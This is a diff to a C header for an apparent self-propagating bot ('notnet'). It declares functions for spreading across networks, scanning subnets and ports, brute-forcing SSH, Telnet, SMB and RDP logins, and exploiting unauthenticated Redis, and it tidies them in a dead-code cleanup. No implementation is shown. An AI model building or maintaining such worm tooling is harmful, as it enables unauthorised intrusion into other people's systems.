@@ -35,9 +35,7 @@ typedef struct {
 
 /* ── Core Functions ─────────────────────────────────────────── */
 int spread_local(notnet_bot_t *bot);
-int spread_target(notnet_bot_t *bot, notnet_target_t *target);
 int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
-int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port);
 int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
 int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
 int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
@@ -94,13 +92,13 @@ int cve_module_count(void);
 const cve_module_t *cve_module_at(int idx);
 
 /* ── Service Helpers ────────────────────────────────────────── */
-/* Returns socket fd on success (caller must close), -1 on failure.
- * SECURITY FIX (#15): Changed from int success to int fd so the caller
- * can send commands over the established connection. */
-int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass);
-int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass);
-int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass);
-int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass);
+/* Timeout-aware login variants are the LIVE paths (the non-timeout
+ * variants were removed in the #112 dead-code sweep). Returns socket fd
+ * on success (caller must close), -1 on failure. */
+int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
 int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port);
 int exploit_redis_sock(notnet_bot_t *bot, int sock);
 
